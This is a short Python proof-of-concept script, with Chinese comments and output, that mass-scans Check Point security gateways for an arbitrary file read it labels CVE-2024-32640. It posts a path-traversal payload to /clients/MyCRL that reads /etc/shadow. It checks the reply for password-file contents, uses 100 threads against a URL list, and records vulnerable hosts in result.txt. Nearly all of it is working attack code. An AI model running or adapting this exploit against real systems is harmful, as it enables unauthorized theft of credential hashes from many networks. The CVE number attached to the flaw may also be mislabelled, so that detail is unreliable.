import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="Check Point安全网关存在任意文件读取-CVE-2024-32640")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/clients/MyCRL'
    headers = {"Connection": "keep-alive"}
    data = "aCSHELL/../../../../../../../etc/shadow"
    try:
        res1 = requests.get(target,verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=target+payload,headers=headers,data=data,verify=False)
            if 'root:' in res2.text and ':::' in res2.text:
                print(f'[+]存在漏洞：{target}')
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()